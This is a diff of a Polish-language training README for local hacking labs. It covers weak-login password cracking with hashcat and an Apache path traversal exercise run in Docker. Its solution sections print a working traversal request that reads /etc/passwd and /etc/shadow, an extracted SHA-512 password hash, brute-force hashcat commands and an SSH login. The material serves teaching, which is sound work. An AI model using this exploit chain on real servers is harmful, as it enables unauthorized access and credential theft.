@@ -13,7 +13,12 @@ Jest to luka utworzona poprzez zwykły ludzki błąd przy projektowaniu systemu 
 
 ## **Zaczynamy**:
 
-	@@ -22,13 +22,13 @@ Jest to luka utworzona poprzez zwykły ludzki błąd przy projektowaniu systemu
+1. Należy uruchomić serwer oraz client za pomocą komendy
+    ```
+     npm start
+    ```
+2. Teraz uruchom bazę danych w dokerze za pomocą komendy (należy znajdować się w folderze zawierającym plik "docker-compose.yaml"):
+    ```
     docker compose up
     ```
 ## **Zadanie 1**
@@ -27,7 +32,11 @@ Wysyłamy zapytanie z formularza logowania do użytkownika `admin` za pomocą **
 
 Uzyskanie hasło próbujemy złamać przy pomocy hashcata
 
-	@@ -40,12 +40,12 @@ hashcat -m 1800 -a3 password ?u?u?u?u
+uruchamiamy hashcata
+
+```
+hashcat -m 1800 -a3 password ?u?u?u?u
+```
 
 Opcja "-m 1800" wskazuje na rodzaj szyfrowania hasła (rodzaj hashu), a w tym przypadku jest to rodzaj hashu SHA-512(Unix). Opcja "-a 3" oznacza, że hashcat będzie używał metody brute-force (przeprowadzenie próby złamania hasła poprzez wypróbowanie wszystkich możliwych kombinacji).
 
@@ -40,7 +49,13 @@ Czyli hashcat dla argunetu "?u?u?u?u" wygeneruje wszytskie 4 znakowe możliwośc
 
 Po złamaniu hasła logujemy się na serwer
 
-	@@ -59,7 +59,7 @@ Po złamaniu hasła logujemy się na serwer
+</details>
+
+
+
+<br><br>
+
+# __Path Traversal__
 
 Path Traversal to poważna luka w zabezpieczeniach, która może być wykorzystywana przez hakerów do uzyskania nieautoryzowanego dostępu do systemu lub do wykonania nieautoryzowanych poleceń na zdalnym komputerze.
 
@@ -48,7 +63,27 @@ Path Traversal to poważna luka w zabezpieczeniach, która może być wykorzysty
 
 **Apache** to darmowe, otwartoźródłowe i wieloplatformowe oprogramowanie serwera WWW wydane na licencji Apache License 2.0. Oprogramowanie jest utrzymywane i rozwijane przez organizację non profit Apache Software Foundation.
 
-	@@ -87,18 +87,18 @@ docker run -p 8090:80 -p 22:22 gekonisko/path-traversal
+Podatność **Path Travesal** występuje jeśli serwer posiada następującą konfiguracją
+
+```console
+<Directory />
+Require all granted
+</Directory>
+```
+
+W tym przypadku ustawienie `Require all granted` oznacza, że wszyscy użytkownicy mają mieć dostęp do plików i katalogów.
+
+
+<br>
+<br>
+
+## **Zaczynamy**:
+
+1. Należy uruchomić kontener komendą
+
+```console
+docker run -p 8090:80 -p 22:22 gekonisko/path-traversal
+```
 
 Kontener wystawia dwa port
 
@@ -67,7 +102,41 @@ Serwer powinien zwrócić zawartość pliku `/etc/passwd` zawierający również
 
 ```console
 …
-	@@ -140,7 +140,7 @@ hashcat -m 1800 -a3 password ?u?u?u
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+agh:x:1000:1000:,,,:/home/agh:/bin/bash
+```
+
+## **Zadanie 2**
+
+Serwer ma wystawiony również protokół SSH, twoim zadaniem jest zalogowanie się na użytkownika agh przez protokół ssh `ssh agh@localhost`. Wykorzystaj plik `etc/shadow` aby wyciągnąć hasło użytkownika agh.
+
+<details>
+<summary>Rozwązanie</summary>
+
+```console
+ curl http://localhost:8090/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/shadow
+```
+
+wynik:
+
+```console
+...
+agh:$6$bDdeQMyxkE4l8q5s$iLIB.yf/lxCMGCAdx8yHiW9/av0JM.gCo5vy7aLpUG9Q/KWbD6m3BfxXFCKuyzFd1urcoGePMJ.pVKogH.sAw1:19364:0:99999:7:::
+```
+
+zapisujemy hash w pliku
+
+```
+echo '$6$bDdeQMyxkE4l8q5s$iLIB.yf/lxCMGCAdx8yHiW9/av0JM.gCo5vy7aLpUG9Q/KWbD6m3BfxXFCKuyzFd1urcoGePMJ.pVKogH.sAw1' > password
+```
+
+uruchamiamy hashcata
+
+```
+hashcat -m 1800 -a3 password ?u?u?u
+```
 
 Opcja "-m 1800" wskazuje na rodzaj szyfrowania hasła (rodzaj hashu), a w tym przypadku jest to rodzaj hashu SHA-512(Unix). Opcja "-a 3" oznacza, że hashcat będzie używał metody brute-force (przeprowadzenie próby złamania hasła poprzez wypróbowanie wszystkich możliwych kombinacji).
 
@@ -75,3 +144,11 @@ password to plik w którym przechowujemy hash, który będzie przez nas łamany
 
 Jeśli chodzi o ciąg znaków "?u?u?u", to jest to szablon, który określa, jakie hasło będzie szukane [link](https://hashcat.net/wiki/doku.php?id=mask_attack).
 ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
+
+Po złamaniu hasła logujemy sie na serwer
+
+```
+ssh agh@localhost
+```
+
+</details>
